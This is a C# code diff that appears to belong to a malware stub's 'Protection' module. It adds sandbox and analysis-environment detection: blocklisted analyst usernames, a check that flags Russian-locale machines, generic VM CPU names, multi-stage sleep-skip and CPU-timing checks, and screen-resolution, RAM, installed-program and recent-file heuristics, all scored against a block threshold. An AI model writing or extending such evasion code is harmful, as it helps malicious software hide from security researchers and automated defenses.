@@ -31,6 +31,9 @@ internal static partial class Protection
     [return: MarshalAs(UnmanagedType.Bool)]
     private static partial bool GetCursorPos(out POINT lpPoint);
 
+    [LibraryImport("user32.dll")]
+    private static partial int GetSystemMetrics(int nIndex);
+
     [StructLayout(LayoutKind.Sequential)]
     private struct POINT { public int X; public int Y; }
 
@@ -767,8 +770,12 @@ Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object {{$
     private static readonly string[] SuspiciousUsers = [
         "sandbox", "virus", "malware", "sample",
         "currentuser", "analyst", "tequilaboomboom",
-        "sand box", "maltest", "plmsqjvtest"
+        "sand box", "maltest", "plmsqjvtest",
+        "bruno", "fred", "maria", "janusz",
     ];
+
+    // ISO 3166-1 alpha-2 codes of blacklisted regions
+    private static readonly string[] BlacklistedCountries = ["RU"];
 
     public static bool IsAnalysisEnvironment()
     {
@@ -819,6 +826,46 @@ Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object {{$
             }
         }
 
+        // Blacklisted region — read from registry (works with InvariantGlobalization=true)
+        try
+        {
+            // HKCU\Control Panel\International → LocaleName = "ru-RU", "en-US", etc.
+            using var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Control Panel\International");
+            var locale = key?.GetValue("LocaleName")?.ToString() ?? "";
+            // Extract country code: "ru-RU" → "RU"
+            var dash = locale.IndexOf('-');
+            var code = (dash >= 0 ? locale[(dash + 1)..] : locale).ToUpperInvariant();
+            foreach (var c in BlacklistedCountries)
+            {
+                if (code == c)
+                {
+                    score += 3;
+                    StubLog.Info($"[AntiDetect] Blacklisted region: {code} (+3, total={score})");
+                    break;
+                }
+            }
+        }
+        catch { }
+
+        // Generic/broadcast CPU name — VMs that don't pass real CPU info
+        try
+        {
+            using var cpuKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
+                @"HARDWARE\DESCRIPTION\System\CentralProcessor\0");
+            if (cpuKey != null)
+            {
+                var cpu = cpuKey.GetValue("ProcessorNameString")?.ToString()?.Trim() ?? "";
+                if (cpu.Equals("Intel Processor", StringComparison.OrdinalIgnoreCase)
+                    || cpu.StartsWith("Intel(R) Processor", StringComparison.OrdinalIgnoreCase)
+                    || cpu.Length == 0)
+                {
+                    score += 3;
+                    StubLog.Info($"[AntiDetect] Generic CPU: '{cpu}' (+3, total={score})");
+                }
+            }
+        }
+        catch { }
+
         if (score >= 3)
             StubLog.Info($"[AntiDetect] BLOCKED — score={score} (threshold=3)");
 
@@ -829,26 +876,47 @@ Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object {{$
 
     public static bool IsSandbox()
     {
-        // Use a scoring system: need at least 3 indicators to flag as sandbox
         int score = 0;
 
-        // Uptime check: sandboxes restart VMs frequently
-        if (Environment.TickCount64 < 3 * 60 * 1000) score++; // < 3 minutes
+        // Uptime check
+        if (Environment.TickCount64 < 3 * 60 * 1000) score++;
 
-        // Sleep-skip detection: sandbox fast-forwards sleeps
-        var sw = Stopwatch.StartNew();
-        Thread.Sleep(500);
-        sw.Stop();
-        if (sw.ElapsedMilliseconds < 400) score += 2; // strong indicator
+        // Multi-stage sleep verification — each stage must not be fast-forwarded
+        // Forces the sandbox to either spend 1.2s or reveal itself on first skip
+        for (int stage = 0; stage < 3; stage++)
+        {
+            int ms = 300 + stage * 100; // 300, 400, 500ms
+            var sw = Stopwatch.StartNew();
+            Thread.Sleep(ms);
+            sw.Stop();
+            if (sw.ElapsedMilliseconds < ms * 0.8)
+            {
+                score += 2;
+                StubLog.Info($"[AntiSandbox] Sleep-skip stage {stage}: {sw.ElapsedMilliseconds}ms (+2)");
+                break;
+            }
+        }
 
-        // Temp files count: real machines have many temp files
+        // CPU compute check — emulators fast-forward Sleep but can't hide CPU execution cost
         try
         {
-            var tempDir = Path.GetTempPath();
-            if (Directory.Exists(tempDir))
+            long t0 = Environment.TickCount64;
+            long acc = unchecked((long)0x9e3779b97f4a7c15L);
+            for (long i = 0; i < 50_000_000L; i++)
+                acc = unchecked(acc * 6364136223846793005L + 1442695040888963407L ^ (acc >> 33));
+            GC.KeepAlive(acc);
+            if (Environment.TickCount64 - t0 < 50)
             {
-                if (Directory.GetFiles(tempDir).Length < 3) score++;
+                score++;
+                StubLog.Info("[AntiSandbox] CPU compute too fast (+1)");
             }
+        }
+        catch { }
+
+        // Temp files count
+        try
+        {
+            if (Directory.GetFiles(Path.GetTempPath()).Length < 3) score++;
         }
         catch { }
 
@@ -857,21 +925,37 @@ Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object {{$
         {
             using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                 @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall");
-            if (key != null)
+            if (key != null && key.GetSubKeyNames().Length < 8) score++;
+        }
+        catch { }
+
+        // RAM check
+        try
+        {
+            var memStatus = new MEMORYSTATUSEX { dwLength = (uint)Marshal.SizeOf<MEMORYSTATUSEX>() };
+            if (GlobalMemoryStatusEx(ref memStatus) && memStatus.ullTotalPhys < 1UL * 1024 * 1024 * 1024)
+                score++;
+        }
+        catch { }
+
+        // Screen resolution — headless/minimal sandbox displays
+        try
+        {
+            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
+            if (w < 1024 || h < 600)
             {
-                if (key.GetSubKeyNames().Length < 8) score++;
+                score++;
+                StubLog.Info($"[AntiSandbox] Low resolution: {w}x{h} (+1)");
             }
         }
         catch { }
 
-        // RAM check: sandboxes typically have very little RAM
+        // Recent files — sandboxes have pristine user profiles
         try
         {
-            var memStatus = new MEMORYSTATUSEX { dwLength = (uint)Marshal.SizeOf<MEMORYSTATUSEX>() };
-            if (GlobalMemoryStatusEx(ref memStatus))
-            {
-                if (memStatus.ullTotalPhys < 1UL * 1024 * 1024 * 1024) score++; // < 1 GB
-            }
+            var recent = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
+            if (Directory.Exists(recent) && Directory.GetFiles(recent, "*.lnk").Length < 5)
+                score++;
         }
         catch { }
 
